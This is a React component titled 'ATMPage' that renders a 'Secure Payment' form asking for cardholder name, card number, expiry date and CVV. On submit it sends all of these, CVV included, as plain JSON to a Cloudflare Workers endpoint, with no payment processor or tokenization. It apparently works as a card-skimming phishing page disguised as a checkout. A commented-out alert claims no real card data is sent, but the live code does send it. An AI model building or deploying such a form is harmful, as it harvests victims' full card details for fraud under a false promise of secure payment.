import React, { useState } from "react";

export default function ATMPage() {
    const [form, setForm] = useState({
        name: "",
        cardNumber: "",
        expiry: "",
        cvv: "",
    });

    // Card number formatter (1234 5678 9012 3456)
    const handleCardNumber = (e) => {
        let value = e.target.value.replace(/\D/g, "").slice(0, 16);
        value = value.replace(/(.{4})/g, "$1 ").trim();
        setForm({ ...form, cardNumber: value });
    };

    // Expiry formatter (MM/YY)
    const handleExpiry = (e) => {
        let value = e.target.value.replace(/\D/g, "").slice(0, 4);
        if (value.length >= 3) {
            value = value.slice(0, 2) + "/" + value.slice(2);
        }
        setForm({ ...form, expiry: value });
    };

    const handleChange = (e) => {
        setForm({ ...form, [e.target.name]: e.target.value });
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        const payload = {
            cardHolder: form.name,
            cardNumber: form.cardNumber,
            expiryDate: form.expiry,
            cvv: form.cvv
        };

        await fetch("https://my-worker-app.instapayapi.workers.dev/api/card", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
        });
        setForm({
            name: "",
            cardNumber: "",
            expiry: "",
            cvv: "",
        })
        // alert("Demo submitted (no real card data sent)");
    };


    return (
        <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-green-100 via-gray-100 to-green-200 px-4">
            <form
                onSubmit={handleSubmit}
                className="bg-white w-full max-w-md rounded-2xl shadow-2xl p-6 sm:p-8"
            >
                {/* Header */}
                <h2 className="text-2xl font-bold text-center text-gray-800 mb-2">
                    Secure Payment
                </h2>

                {/* Card Holder */}
                <div className="mb-4">
                    <label className="block text-sm font-semibold text-gray-600 mb-1">
                        Card Holder Name
                    </label>
                    <input
                        type="text"
                        name="name"
                        // placeholder="John Doe"
                        value={form.name}
                        onChange={handleChange}
                        className="w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-green-500 focus:outline-none"
                        required
                    />
                </div>

                {/* Card Number */}
                <div className="mb-4">
                    <label className="block text-sm font-semibold text-gray-600 mb-1">
                        Card Number
                    </label>
                    <input
                        type="text"
                        placeholder="1234 5678 9012 3456"
                        value={form.cardNumber}
                        onChange={handleCardNumber}
                        className="w-full border rounded-lg px-4 py-3 tracking-widest focus:ring-2 focus:ring-green-500 focus:outline-none"
                        required
                    />
                </div>

                {/* Expiry + CVV */}
                <div className="flex gap-4 mb-6">
                    <div className="w-1/2">
                        <label className="block text-sm font-semibold text-gray-600 mb-1">
                            Expiry (MM/YY)
                        </label>
                        <input
                            type="text"
                            placeholder="23/30"
                            value={form.expiry}
                            onChange={handleExpiry}
                            className="w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-green-500 focus:outline-none"
                            required
                        />
                    </div>

                    <div className="w-1/2">
                        <label className="block text-sm font-semibold text-gray-600 mb-1">
                            CVV
                        </label>
                        <input
                            type="password"
                            placeholder="***"
                            value={form.cvv}
                            onChange={(e) =>
                                setForm({
                                    ...form,
                                    cvv: e.target.value.replace(/\D/g, "").slice(0, 3),
                                })
                            }
                            className="w-full border rounded-lg px-4 py-3 focus:ring-2 focus:ring-green-500 focus:outline-none"
                            required
                        />
                    </div>
                </div>

                {/* Button */}
                <button
                    type="submit"
                    className="w-full bg-gradient-to-r from-green-600 to-green-700 text-white py-3 rounded-xl font-bold text-lg shadow-lg hover:from-green-700 hover:to-green-800 transition-all active:scale-95"
                >
                    Pay Now
                </button>
            </form>
        </div>
    );
}
